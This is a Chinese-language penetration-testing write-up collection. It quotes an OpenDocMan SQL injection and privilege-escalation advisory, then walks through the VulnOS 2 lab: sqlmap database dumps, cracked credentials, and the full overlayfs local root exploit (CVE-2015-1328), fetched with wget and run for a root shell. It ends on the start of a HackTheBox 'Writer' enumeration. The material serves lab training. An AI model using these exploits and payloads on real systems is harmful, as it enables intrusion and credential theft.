High-Tech Bridge Security Research Lab discovered multiple vulnerabilities in OpenDocMan, which can be exploited to perform SQL Injection and gain administrative access to the application.                                                              

1) SQL Injection in OpenDocMan: CVE-2014-1945

The vulnerability exists due to insufficient validation of "add_value" HTTP GET parameter in "/ajax_udf.php" script. A remote unauthenticated attacker can execute arbitrary SQL commands in application's database.

The exploitation example below displays version of the MySQL server:

http://[host]/ajax_udf.php?q=1&add_value=odm_user%20UNION%20SELECT%201,v
ersion%28%29,3,4,5,6,7,8,9

2) Improper Access Control in OpenDocMan: CVE-2014-1946

The vulnerability exists due to insufficient validation of allowed action in "/signup.php" script when updating userâ??s profile. A remote authenticated attacker can assign administrative privileges to the current account and gain complete control over the application.

The exploitation example below assigns administrative privileges for the current account:

<form action="http://[host]/signup.php" method="post" name="main">
<input type="hidden" name="updateuser" value="1">
<input type="hidden" name="admin" value="1">
<input type="hidden" name="id" value="[USER_ID]">
<input type="submit" name="login" value="Run">
</form>

------------------------------------------------------------------------
-----------------------

Solution:

Update to OpenDocMan v1.2.7.2

More Information:
http://www.opendocman.com/opendocman-v1-2-7-1-release/
http://www.opendocman.com/opendocman-v1-2-7-2-released/

------------------------------------------------------------------------
-----------------------

References:

[1] High-Tech Bridge Advisory HTB23202 - https://www.htbridge.com/advisory/HTB23202 - Multiple vulnerabilities in OpenDocMan.
[2] OpenDocMan - http://www.opendocman.com/ - Open Source Document Management System written in PHP.
[3] Common Vulnerabilities and Exposures (CVE) - http://cve.mitre.org/ - international in scope and free for public use, CVEÂ® is a dictionary of publicly known information security vulnerabilities and exposures.
[4] Common Weakness Enumeration (CWE) - http://cwe.mitre.org - targeted to developers and security practitioners, CWE is a formal list of software weakness types.
[5] ImmuniWebÂ® - http://www.htbridge.com/immuniweb/ - is High-Tech Bridge's proprietary web application security assessment solution with SaaS delivery model that combines manual and automated vulnerability testing.

------------------------------------------------------------------------
-----------------------

Disclaimer: The information provided in this Advisory is provided "as is" and without any warranty of any kind. Details of this Advisory may be updated in order to provide as accurate information as possible. The latest version of the Advisory is available on web page [1] in the References.
```

现在，使用sqlmap来查找用户名和密码的数据库，像下面这样：

该操作使用了burp中与sqlmap联动的插件，右键可以直接注入

 - 跑库

``` bash
D:\burpcn2.0\BurpSuite_pro_v2.1\BurpSuite_pro_v2.1>sqlmap.py -r C:\Users\HASEE\AppData\Local\Temp\\1587350985142.req --level 5 --risk 3 --dbs
available databases [6]:
[*] drupal7
[*] information_schema
[*] jabcd0cs
[*] mysql
[*] performance_schema
[*] phpmyadmin
```

 - 跑表

``` bash
D:\burpcn2.0\BurpSuite_pro_v2.1\BurpSuite_pro_v2.1>sqlmap.py -r C:\Users\HASEE\AppData\Local\Temp\\1587350985142.req --level 5 --risk 3 -D jabcd0cs --tables
Database: jabcd0cs
[15 tables]
+-------------------+
| odm_access_log    |
| odm_admin         |
| odm_category      |
| odm_data          |
| odm_department    |
| odm_dept_perms    |
| odm_dept_reviewer |
| odm_filetypes     |
| odm_log           |
| odm_odmsys        |
| odm_rights        |
| odm_settings      |
| odm_udf           |
| odm_user          |
| odm_user_perms    |
+-------------------+
```

 - 跑用户名和密码的hash值

``` bash
D:\burpcn2.0\BurpSuite_pro_v2.1\BurpSuite_pro_v2.1>sqlmap.py -r C:\Users\HASEE\AppData\Local\Temp\\1587350985142.req --level 5 --risk 3 -D jabcd0cs -T odm_user --dump
Database: jabcd0cs
Table: odm_user
[2 entries]
+------+-------------+--------------------+----------+-----------+------------+------------------------------------------+------------+---------------+
| id   | phone       | Email              | username | last_name | first_name | password                                 | department | pw_reset_code |
+------+-------------+--------------------+----------+-----------+------------+------------------------------------------+------------+---------------+
| 1    | 5555551212  | webmin@example.com | webmin   | min       | web        | b78aae356709f8c31118ea613980954b         | 2          | <blank>       |
| 2    | 555 5555555 | guest@example.com  | guest    | guest     | guest      | 084e0343a0486ff05530df6c705c8bb4 (guest) | 2          | NULL          |
+------+-------------+--------------------+----------+-----------+------------+------------------------------------------+------------+---------------+
```

使用在线解密工具破解一下webmin的hash值

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub268.jpg)

webmin/webmin1980

密码为webmin1980，用户名为webmin。通过SSH端口登录。在kali中打开一个新终端，然后键入：

``` bash
root@kali:~# ssh webmin@192.168.56.104
The authenticity of host '192.168.56.104 (192.168.56.104)' can't be established.
ECDSA key fingerprint is SHA256:nIyyJRPJMy1g6F5m8AIT7W//x6lj3ZqhUbYuvSafKeI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.104' (ECDSA) to the list of known hosts.
Enter passphrase for key '/root/.ssh/id_rsa': 
webmin@192.168.56.104's password: 
Welcome to Ubuntu 14.04.4 LTS (GNU/Linux 3.13.0-24-generic i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Mon Apr 20 04:13:19 CEST 2020

  System load: 0.15              Memory usage: 2%   Processes:       57
  Usage of /:  5.7% of 29.91GB   Swap usage:   0%   Users logged in: 0

  Graph this data and manage this system at:
    https://landscape.canonical.com/

Last login: Wed May  4 10:41:07 2016
$ id
uid=1001(webmin) gid=1001(webmin) groups=1001(webmin)
$ whoami
webmin
$ uname -a
Linux VulnOSv2 3.13.0-24-generic #47-Ubuntu SMP Fri May 2 23:31:42 UTC 2014 i686 i686 i686 GNU/Linux
```

检查内核的版本，看看它是否容易受到攻击。

``` bash
$ lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 14.04.4 LTS
Release:        14.04
Codename:       trusty
```

版本是14.04，表示可以被利用，并且适用于该类型：

``` bash
root@kali:~# searchsploit ubuntu 14.04
------------------------------------------------------------------------------------ ----------------------------------------
 Exploit Title                                                                      |  Path
                                                                                    | (/usr/share/exploitdb/)
------------------------------------------------------------------------------------ ----------------------------------------
Apport (Ubuntu 14.04/14.10/15.04) - Race Condition Privilege Escalation             | exploits/linux/local/37088.c
Apport 2.14.1 (Ubuntu 14.04.2) - Local Privilege Escalation                         | exploits/linux/local/36782.sh
Linux Kernel (Debian 7.7/8.5/9.0 / Ubuntu 14.04.2/16.04.2/17.04 / Fedora 22/25 / Ce | exploits/linux_x86-64/local/42275.c
Linux Kernel (Debian 9/10 / Ubuntu 14.04.5/16.04.2/17.04 / Fedora 23/24/25) - 'ldso | exploits/linux_x86/local/42276.c
Linux Kernel (Ubuntu 14.04.3) - 'perf_event_open()' Can Race with execve() (Access  | exploits/linux/local/39771.txt
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Pri | exploits/linux/local/37292.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Pri | exploits/linux/local/37293.txt
Linux Kernel 3.x (Ubuntu 14.04 / Mint 17.3 / Fedora 22) - Double-free usb-midi SMEP | exploits/linux/local/41999.txt
Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) - 'overlayfs' Local Privilege Escalation (1 | exploits/linux/local/39166.c
Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - 'AF_PACKET' Race Condition Privile | exploits/linux_x86-64/local/40871.c
Linux Kernel 4.4.0-21 < 4.4.0-51 (Ubuntu 14.04/16.04 x86-64) - 'AF_PACKET' Race Con | exploits/linux/local/47170.c
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalat | exploits/linux/local/43418.c
Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Loc | exploits/linux/local/47169.c
NetKit FTP Client (Ubuntu 14.04) - Crash/Denial of Service (PoC)                    | exploits/linux/dos/37777.txt
Ubuntu 14.04/15.10 - User Namespace Overlayfs Xattr SetGID Privilege Escalation     | exploits/linux/local/41762.txt
WebKitGTK 2.1.2 (Ubuntu 14.04) - Heap based Buffer Overflow                         | exploits/linux/local/44204.md
usb-creator 0.2.x (Ubuntu 12.04/14.04/14.10) - Local Privilege Escalation           | exploits/linux/local/36820.txt
------------------------------------------------------------------------------------ ----------------------------------------
```

列出了许多可以利用的漏洞，从其中选择37292.c作为overlayfs的“本地提权”。

``` bash
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Pri | exploits/linux/local/37292.c
```

查看exploit

``` bash
root@kali:~# cat /usr/share/exploitdb/exploits/linux/local/37292.c
/*
# Exploit Title: ofs.c - overlayfs local root in ubuntu
# Date: 2015-06-15
# Exploit Author: rebel
# Version: Ubuntu 12.04, 14.04, 14.10, 15.04 (Kernels before 2015-06-15)
# Tested on: Ubuntu 12.04, 14.04, 14.10, 15.04
# CVE : CVE-2015-1328     (http://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1328.html)

*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*
CVE-2015-1328 / ofs.c
overlayfs incorrect permission handling + FS_USERNS_MOUNT

user@ubuntu-server-1504:~$ uname -a
Linux ubuntu-server-1504 3.19.0-18-generic #18-Ubuntu SMP Tue May 19 18:31:35 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
user@ubuntu-server-1504:~$ gcc ofs.c -o ofs
user@ubuntu-server-1504:~$ id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),30(dip),46(plugdev)
user@ubuntu-server-1504:~$ ./ofs
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),30(dip),46(plugdev),1000(user)

greets to beist & kaliman
2015-05-24
%rebel%
*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sched.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/mount.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sched.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/mount.h>
#include <sys/types.h>
#include <signal.h>
#include <fcntl.h>
#include <string.h>
#include <linux/sched.h>

#define LIB "#include <unistd.h>\n\nuid_t(*_real_getuid) (void);\nchar path[128];\n\nuid_t\ngetuid(void)\n{\n_real_getuid = (uid_t(*)(void)) dlsym((void *) -1, \"getuid\");\nreadlink(\"/proc/self/exe\", (char *) &path, 128);\nif(geteuid() == 0 && !strcmp(path, \"/bin/su\")) {\nunlink(\"/etc/ld.so.preload\");unlink(\"/tmp/ofs-lib.so\");\nsetresuid(0, 0, 0);\nsetresgid(0, 0, 0);\nexecle(\"/bin/sh\", \"sh\", \"-i\", NULL, NULL);\n}\n    return _real_getuid();\n}\n"

static char child_stack[1024*1024];

static int
child_exec(void *stuff)
{
    char *file;
    system("rm -rf /tmp/ns_sploit");
    mkdir("/tmp/ns_sploit", 0777);
    mkdir("/tmp/ns_sploit/work", 0777);
    mkdir("/tmp/ns_sploit/upper",0777);
    mkdir("/tmp/ns_sploit/o",0777);

    fprintf(stderr,"mount #1\n");
    if (mount("overlay", "/tmp/ns_sploit/o", "overlayfs", MS_MGC_VAL, "lowerdir=/proc/sys/kernel,upperdir=/tmp/ns_sploit/upper") != 0) {
// workdir= and "overlay" is needed on newer kernels, also can't use /proc as lower
        if (mount("overlay", "/tmp/ns_sploit/o", "overlay", MS_MGC_VAL, "lowerdir=/sys/kernel/security/apparmor,upperdir=/tmp/ns_sploit/upper,workdir=/tmp/ns_sploit/work") != 0) {
            fprintf(stderr, "no FS_USERNS_MOUNT for overlayfs on this kernel\n");
            exit(-1);
        }
        file = ".access";
        chmod("/tmp/ns_sploit/work/work",0777);
    } else file = "ns_last_pid";

    chdir("/tmp/ns_sploit/o");
    rename(file,"ld.so.preload");

    chdir("/");
    umount("/tmp/ns_sploit/o");
    fprintf(stderr,"mount #2\n");
    if (mount("overlay", "/tmp/ns_sploit/o", "overlayfs", MS_MGC_VAL, "lowerdir=/tmp/ns_sploit/upper,upperdir=/etc") != 0) {
        if (mount("overlay", "/tmp/ns_sploit/o", "overlay", MS_MGC_VAL, "lowerdir=/tmp/ns_sploit/upper,upperdir=/etc,workdir=/tmp/ns_sploit/work") != 0) {
            exit(-1);
        }
        chmod("/tmp/ns_sploit/work/work",0777);
    }

    chmod("/tmp/ns_sploit/o/ld.so.preload",0777);
    umount("/tmp/ns_sploit/o");
}

int
main(int argc, char **argv)
{
    int status, fd, lib;
    pid_t wrapper, init;
    int clone_flags = CLONE_NEWNS | SIGCHLD;

    fprintf(stderr,"spawning threads\n");

    if((wrapper = fork()) == 0) {
        if(unshare(CLONE_NEWUSER) != 0)
            fprintf(stderr, "failed to create new user namespace\n");

        if((init = fork()) == 0) {
            pid_t pid =
                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);
            if(pid < 0) {
                fprintf(stderr, "failed to create new mount namespace\n");
                exit(-1);
            }

            waitpid(pid, &status, 0);

        }

        waitpid(init, &status, 0);
        return 0;
    }

    usleep(300000);

    wait(NULL);

    fprintf(stderr,"child threads done\n");

    fd = open("/etc/ld.so.preload",O_WRONLY);

    if(fd == -1) {
        fprintf(stderr,"exploit failed\n");
        exit(-1);
    }

    fprintf(stderr,"/etc/ld.so.preload created\n");
    fprintf(stderr,"creating shared library\n");
    lib = open("/tmp/ofs-lib.c",O_CREAT|O_WRONLY,0777);
    write(lib,LIB,strlen(LIB));
    close(lib);
    lib = system("gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");
    if(lib != 0) {
        fprintf(stderr,"couldn't create dynamic library\n");
        exit(-1);
    }
    write(fd,"/tmp/ofs-lib.so\n",16);
    close(fd);
    system("rm -rf /tmp/ns_sploit /tmp/ofs-lib.c");
    execl("/bin/su","su",NULL);
}
```

将exploit拷贝一份过来然后传输到目标机器上编译并运行

``` bash
root@kali:~/vulnhub/vulnos-2# cp /usr/share/exploitdb/exploits/linux/local/37292.c .
root@kali:~/vulnhub/vulnos-2# ls
37292.c
root@kali:~/vulnhub/vulnos-2# python -m SimpleHTTPServer 
Serving HTTP on 0.0.0.0 port 8000 ...                                                                                      
192.168.56.1 - - [19/Apr/2020 23:29:04] code 404, message File not found                                                   
192.168.56.1 - - [19/Apr/2020 23:29:04] "GET /robots.txt HTTP/1.1" 404 -                                                     
192.168.56.1 - - [19/Apr/2020 23:29:04] "GET / HTTP/1.1" 200 -
192.168.56.1 - - [19/Apr/2020 23:29:04] code 404, message File not found
192.168.56.1 - - [19/Apr/2020 23:29:04] "GET /favicon.ico HTTP/1.1" 404 -
192.168.56.104 - - [19/Apr/2020 23:29:54] "GET /37292.c HTTP/1.1" 200 -
```

受害机器运行

``` bash
$ wget http://192.168.56.102:8000/37292.c
--2020-04-20 05:29:53--  http://192.168.56.102:8000/37292.c
Connecting to 192.168.56.102:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5119 (5.0K) [text/plain]
Saving to: ‘37292.c’

100%[===================================================================================>] 5,119       --.-K/s   in 0s      

2020-04-20 05:29:53 (895 MB/s) - ‘37292.c’ saved [5119/5119]

$ ls
37292.c
$ chmod 777 *
$ ls -la
total 16
drwxrwxrwx  2 root   root   4096 Apr 20 05:29 .
drwxr-xr-x 21 root   root   4096 Apr  3  2016 ..
-rwxrwxrwx  1 webmin webmin 5119 Apr 20 05:28 37292.c
```

编译并执行程序

``` bash
$ chmod 777 *
$ ls -la
total 16
drwxrwxrwx  2 root   root   4096 Apr 20 05:29 .
drwxr-xr-x 21 root   root   4096 Apr  3  2016 ..
-rwxrwxrwx  1 webmin webmin 5119 Apr 20 05:28 37292.c
$ gcc 37292.c -o shell
$ ls -la
total 28
drwxrwxrwx  2 root   root    4096 Apr 20 05:30 .
drwxr-xr-x 21 root   root    4096 Apr  3  2016 ..
-rwxrwxrwx  1 webmin webmin  5119 Apr 20 05:28 37292.c
-rwxrwxr-x  1 webmin webmin 12193 Apr 20 05:30 shell
$ ./shell 
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),1001(webmin)
# whoami
root
# cd /root
# ls
flag.txt
# cat flag.txt
Hello and welcome.
You successfully compromised the company "JABC" and the server completely !!
Congratulations !!!
Hope you enjoyed it.

What do you think of A.I.?
```

成功得到root权限并获取了flag


 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub269.jpg)

#### 其它getshell尝试

使用之前的webmin账号密码登录web界面后，还可以添加上传文件的类型，从而上传php脚本文件

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub270.jpg)

成功上传php脚本文件后，访问它发现脚本文件并不能被解析

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub271.jpg)

#### 其它获取root权限的方法

/home/webmin目录下有一个post.tar.gz文件

解压后似乎是“hydra”的复制品。这是为什么呢?
执行“netstat -antp”命令，会看到只有mysql(port3306)和postgresql(5432)数据库服务在本地运行，仅在127.0.0.1上运行。

有一个hydra的本地副本、一个密码bruteforcer和一个仅在本地运行的服务。
首先输入目录“post”，通过输入命令“
./在“make”后面加上“configure”。没有义务去做“安装”，取决于你。
make就可以了。
键入./hydra——帮助检查是否一切正常。

首先在端口5432上强制本地postgres数据库。
为了简单，使用metasploit-framework提供的字典列表“postgres_default_pass.txt”。
只需要在目标机器上获取字典列表。
本地攻击机器上启动apache webserver，将字典列表复制到公共html文件夹中，然后作为目标机器上的“webmin”用户进入shell。

然后启动hydra爆破

成功!现在知道postgresql数据库的用户凭证是postgres:posgtres。
仍然以“webmin”的身份登录到postgresql数据库，四处浏览。

``` bash
\c system

\dt

select * from users;
```

得到了username

``` bash
vulnosadmin
```

password

``` bash
c4nuh4ckm3tw1c3
```

成功登录了ssh

``` bash
root@kali:~# ssh vulnosadmin@192.168.56.104
Enter passphrase for key '/root/.ssh/id_rsa': 
vulnosadmin@192.168.56.104's password: 
Welcome to Ubuntu 14.04.4 LTS (GNU/Linux 3.13.0-24-generic i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Mon Apr 20 05:11:47 CEST 2020

  System load:  0.0               Processes:           86
  Usage of /:   5.8% of 29.91GB   Users logged in:     0
  Memory usage: 16%               IP address for eth0: 192.168.56.104
  Swap usage:   0%

  Graph this data and manage this system at:
    https://landscape.canonical.com/

Last login: Wed May  4 19:35:16 2016 from 192.168.56.101
vulnosadmin@VulnOSv2:~$ id
uid=1000(vulnosadmin) gid=1000(vulnosadmin) groups=1000(vulnosadmin),4(adm),24(cdrom),30(dip),46(plugdev),110(lpadmin),111(sambashare)
vulnosadmin@VulnOSv2:~$ whoami
vulnosadmin
```

在用户“vulnosadmin”的主目录中发现了一个奇怪的文件。

查看它，似乎是一个blender3D文件。Blender 3D是一款三维建模和动画制作软件。

``` bash
vulnosadmin@VulnOSv2:~$ ls
r00t.blend
```

如果在blender中打开文件，会看到一个3D立方体。以实模式显示。

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub272.jpg)

都得到了一个字符串，尝试用作root密码登录ssh

``` bash
ab12fg//drg
```

``` bash
vulnosadmin@VulnOSv2:~$ su root
Password: 
root@VulnOSv2:/home/vulnosadmin# id
uid=0(root) gid=0(root) groups=0(root)
root@VulnOSv2:/home/vulnosadmin# whoami
root
root@VulnOSv2:/home/vulnosadmin# cd /root
root@VulnOSv2:~# ls
flag.txt
root@VulnOSv2:~# cat flag.txt
Hello and welcome.
You successfully compromised the company "JABC" and the server completely !!
Congratulations !!!
Hope you enjoyed it.

What do you think of A.I.?
```

成功登录并得到了flag

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub273.jpg)


#### 知识点总结

 - OpenDocMan 1.2.7 cms sql注入（CVE-2014-1945）
 - Linux内核3.13.0 < 3.19(Ubuntu 12.04/14.04/14.10/15.04)-"overlayfs"本地提权
 - hydra爆破postgresql数据库用户名和密码
 - blender软件查看.blender后缀3d建模文件以寻找root用户ssh密码

<font color="red">Game over</font>

不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this...It's a pity...

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg)

<font color="green">***The end,to be continue...***</font>
<!-- kb:end vulnos-2 -->

</details>

<a id="case-writer"></a>

## UNION 读取与应用命令边界

原文逐列确定 UNION 输出位置，再读取 WSGI/Python 源码并触发处理逻辑。邮件免责声明、进程观察和 APT 提权是后续独立阶段。

<p class="kb-provenance">来源 writer · 原记录 2021-08-06 · 38 个代码块 · 22 处图片引用</p>

<details class="kb-evidence" id="record-writer">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start writer -->

#### introduce

OS: Linux
Difficulty: Medium
Points:	30
Release:	31 Jul 2021
IP:	10.10.11.101

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2046.jpg)

 - ![my htb rank](http://www.hackthebox.eu/badge/image/235857)



#### Enumeration
#### Nmap

``` bash
# Nmap 7.91 scan initiated Sun Aug  1 01:58:59 2021 as: nmap -vvv -p 22,80,139,445 -A -v -oN intial.nmap 10.10.11.101
Nmap scan report for 10.10.11.101
Host is up, received syn-ack (0.13s latency).
Scanned at 2021-08-01 01:59:01 EDT for 17s

PORT    STATE SERVICE     REASON  VERSION
22/tcp  open  ssh         syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:20:b9:d0:52:1f:4e:10:3a:4a:93:7e:50:bc:b8:7d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCwAA7IblnSMXNfqjkkoT+PAk2SPYBRL5gy0K0FQ2XbFGuPk6ImjJLrb0BF6qw3hU/I2V9ARRnn2SvHlz1+lLB0Ie9wkvH1gZfnUBd5X2sOS3vCzYJOBoD+yzJat40YmKx3NLjYCzkMd/KyTGGIH0cdlnROO6eJdnJN1QYMsrM4+QkkrQHtgz5KAk/aE18+1e5toWK1Px+KtVjvPWiD7mTb4J99f79L/5CCI9nUfmjeB8EU9qe3igUQ3zCGVFGUNTA9Vva99kh3SC6YjBe8+9ipFSZFVSqaJoJpZF83Oy2BEPWEb6lgo3cx7FwGH24nT833Y4Urk294/5ym8F3JFxo/FCgtjuYwp5Im1j9oVOGSnECKfC785zZiSu+ubdnxDjvbuRgW34DsKZpbtVvwxs8R/VNE3bSldVLmz5gCwP0Dfaop+Tbn7MW8OJWL6hEQqNiLw3cSBpzPId/EIMO7TMfqVXTfkMtD1yiIlafd3ianGLu+VUpJ3Bg8jk/COUOHj/M=
|   256 10:04:79:7a:29:74:db:28:f9:ff:af:68:df:f1:3f:34 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBD+ZKRtm6JRYjPO1v8n2nR/cGDBj0Oaydm1VE6rUnvyI6bxfnPCaRjvxDrV3eW5rRXbK/ybC0k5WHtQ9iWogmAU=
|   256 77:c4:86:9a:9f:33:4f:da:71:20:2c:e1:51:10:7e:8d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBaCZ4ALrn0m103XaA+e+YPrTO2f1hK8mAD5kUxJ7O9L
80/tcp  open  http        syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Story Bank | Writer.HTB
139/tcp open  netbios-ssn syn-ack Samba smbd 4.6.2
445/tcp open  netbios-ssn syn-ack Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 5s
| nbstat: NetBIOS name: WRITER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   WRITER<00>           Flags: <unique><active>
|   WRITER<03>           Flags: <unique><active>
|   WRITER<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 52234/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 36309/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 34246/udp): CLEAN (Failed to receive data)
|   Check 4 (port 42160/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-08-01T05:59:20
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Aug  1 01:59:18 2021 -- 1 IP address (1 host up) scanned in 19.34 seconds
```

Looks like we have SSH,SMB and WEB. So let's start with SMB

#### SMB
#### Enum4linux

``` bash
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Aug  1 02:04:47 2021

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.11.101
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 10.10.11.101    |
 ==================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ============================================ 
|    Nbtstat Information for 10.10.11.101    |
 ============================================ 
Looking up status of 10.10.11.101
	WRITER          <00> -         B <ACTIVE>  Workstation Service
	WRITER          <03> -         B <ACTIVE>  Messenger Service
	WRITER          <20> -         B <ACTIVE>  File Server Service
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

 ===================================== 
|    Session Check on 10.10.11.101    |
 ===================================== 
[+] Server 10.10.11.101 allows sessions using username '', password ''

 =========================================== 
|    Getting domain SID for 10.10.11.101    |
 =========================================== 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ====================================== 
|    OS information on 10.10.11.101    |
 ====================================== 
[+] Got OS info for 10.10.11.101 from smbclient: 
[+] Got OS info for 10.10.11.101 from srvinfo:
	WRITER         Wk Sv PrQ Unx NT SNT writer server (Samba, Ubuntu)
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03

 ============================= 
|    Users on 10.10.11.101    |
 ============================= 
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: kyle	Name: Kyle Travis	Desc: 

user:[kyle] rid:[0x3e8]

 ========================================= 
|    Share Enumeration on 10.10.11.101    |
 ========================================= 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	writer2_project Disk      
	IPC$            IPC       IPC Service (writer server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.11.101
//10.10.11.101/print$	Mapping: DENIED, Listing: N/A
//10.10.11.101/writer2_project	Mapping: DENIED, Listing: N/A
//10.10.11.101/IPC$	[E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 ==================================================== 
|    Password Policy Information for 10.10.11.101    |
 ==================================================== 


[+] Attaching to 10.10.11.101 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

	[+] WRITER
	[+] Builtin

[+] Password Info for Domain: WRITER

	[+] Minimum password length: 5
	[+] Password history length: None
	[+] Maximum password age: 37 days 6 hours 21 minutes 
	[+] Password Complexity Flags: 000000

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 0

	[+] Minimum password age: None
	[+] Reset Account Lockout Counter: 30 minutes 
	[+] Locked Account Duration: 30 minutes 
	[+] Account Lockout Threshold: None
	[+] Forced Log off Time: 37 days 6 hours 21 minutes 


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5


 ============================== 
|    Groups on 10.10.11.101    |
 ============================== 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ======================================================================= 
|    Users on 10.10.11.101 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================= 
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-1663171886-1921258872-720408159
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-5-21-1663171886-1921258872-720408159 and logon username '', password ''
S-1-5-21-1663171886-1921258872-720408159-500 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-501 WRITER\nobody (Local User)
S-1-5-21-1663171886-1921258872-720408159-502 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-503 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-504 *unknown*\*unknown* (8)
